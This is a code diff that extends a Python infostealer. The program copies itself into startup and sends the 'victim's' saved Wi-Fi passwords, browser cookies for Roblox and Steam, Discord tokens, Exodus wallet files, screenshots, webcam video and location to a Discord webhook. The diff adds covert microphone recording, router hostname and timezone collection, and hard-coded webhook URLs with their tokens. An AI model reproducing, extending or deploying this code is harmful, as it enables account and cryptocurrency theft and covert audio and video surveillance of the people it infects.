@@ -24,6 +24,10 @@ from datetime import datetime, timedelta
 from PIL import ImageGrab
 import cv2
 import pyperclip
+import sounddevice as sd
+import numpy as np
+import wavio
+import threading
 
 
 userhome = os.path.expanduser('~')
@@ -50,7 +54,9 @@ def copy_to_startup():
     except PermissionError as e:
         pass  
 
-webhook = DiscordWebhook(url='YourWebhookURL')#Set up webhook
+webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1131994024169963661/O5qGSqlm3_aJCVox5-3oKLEeF_znzWvmLMeDfyqQF2CICGnwY0BXYXlaHjuQlnVshZ02')#Set up webhook
+#test #https://discord.com/api/webhooks/1131994024169963661/O5qGSqlm3_aJCVox5-3oKLEeF_znzWvmLMeDfyqQF2CICGnwY0BXYXlaHjuQlnVshZ02
+#Suusy script https://discord.com/api/webhooks/1131994203019284581/S5wolQDreb40kHiaGO_qTSM4Ezs9MxH1MQrASxVu7Ko7k6R39G_p0y-cJy5UQKnqy81o
 def ip4():#Get ipv4
     try:
      with urlopen('https://4.ident.me') as response:
@@ -100,6 +106,8 @@ loc=data['loc']
 postal=data['postal']
 latlong=str(loc).split(',')
 lat,long=latlong[0],latlong[1]
+timezone=data['timezone']
+hostname=data['hostname']
 
 
 def edge_logger():
@@ -572,17 +580,43 @@ def webcam():
         pass
 
     webhook.add_file(videodata, 'WebcamVideo.avi')
-    
+def record_audio(duration=5, freq=44100, channels=2):
+    try:
+        # Start recording with the given values of duration and sample frequency
+        recording = sd.rec(int(duration * freq), samplerate=freq, channels=channels, dtype=np.int16)
+        print("Recording...")
 
+        # Wait for the recording to finish
+        sd.wait()
+
+        # Save the recorded audio to a WAV file
+        wavio.write(os.path.join(userhome, 'MicRecording.wav'), recording, freq, sampwidth=2)
+
+        print("Recording saved as", 'MicRecording.wav')
+        with open(os.path.join(userhome, 'MicRecording.wav'), 'rb') as f:
+            audio = f.read()
+        webhook.add_file(audio, 'MicRecording.wav')
+        try:
+           os.remove(os.path.join(userhome, 'MicRecording.wav'))
+        except:
+            pass    
+    except Exception as e:
+        print("Error:", str(e))
+    
+webcamthread=threading.Thread(target=webcam())
+micthread=threading.Thread(target=record_audio())
 
 wifiembed=DiscordEmbed(title='Saved Wifi',description=f'```{wifi}```',color='60cc88')
-locationembed=DiscordEmbed(title='Location Data',description=f'```Latitude: {lat}```\n```Longitude: {long}```\n```City: {city}```\n```Region: {region}```\n```Country: {country}```\n```Postal Code: {postal}```',color='fcba03')
+locationembed=DiscordEmbed(title='Location Data',description=f'```Latitude: {lat}```\n```Longitude: {long}```\n```City: {city}```\n```Region: {region}```\n```Country: {country}```\n```Postal Code: {postal}```\n```Router Hostname: {hostname}```\n```Timezone: {timezone}```\n```Router Orginisation: {org}```',color='fcba03')
 robloxembed=DiscordEmbed(title='Roblox Cookies',description=f'Opera:```{robloopera}```\nChrome:```{roblochrome}```\nEdge:```{robloedge}```\nFirefox:```{roblofire}```',color='6f00ff')
 sysembed=DiscordEmbed(title='System Information',description=f'```Hostname: {info["Hostname"]}```\n```IPv4: {ip4()}```\n```IPv6: {ip6()}```\n```Proccessor: {info["Processor"]}```\n```Ram: {info["RAM"]}```\n```Machine: {info["Machine"]}```\n```Architecture: {info["Architecture"]}```\n```OS: {info["OS"]}```\n```OS-Release: {info["OS-release"]}```\n```OS-Version: {info["OS-version"]}```\n```Mac-Address: {info["Mac-Address"]}```',color='ab222b')
 steamloginembed = DiscordEmbed(title='steamLoginSecure Cookies',description=f'Opera:```{opera_steam_cookie}```\nChrome:```{chrome_steam_cookie}```\nEdge:```{edge_steam_cookie}```\nFirefox:```{firefox_steam_cookie}```',color='4e6cd9')
 steamsesembed = DiscordEmbed(title='Steam sessionid cookies',description=f'Opera:```{opera_session_cookie}```\nChrome:```{chrome_session_cookie}```\nEdge:```{edge_session_cookie}```\nFirefox:```{firefox_session_cookie}```',color='4e6cd9')
 discordtokenembed= DiscordEmbed(title='Discord Token',description=f'Token:\n```{Discordtokens()}```')
-webcam()
+
+webcamthread.start()
+micthread.start()
+
 webhook.add_embed(sysembed) 
 webhook.add_embed(wifiembed)
 webhook.add_embed(locationembed)
@@ -597,5 +631,8 @@ except PermissionError as e:
     webhook.set_content('Permission error to access the browserfiles. Victim needs computer shutdown for restrictions to be lifted')   
 screenie()#screenshots the users screen        
 exo()#get exodus cryptowallet Appdata and adds the zip to webhook
+
+webcamthread.join()
+micthread.join()
 
 webhook.execute()
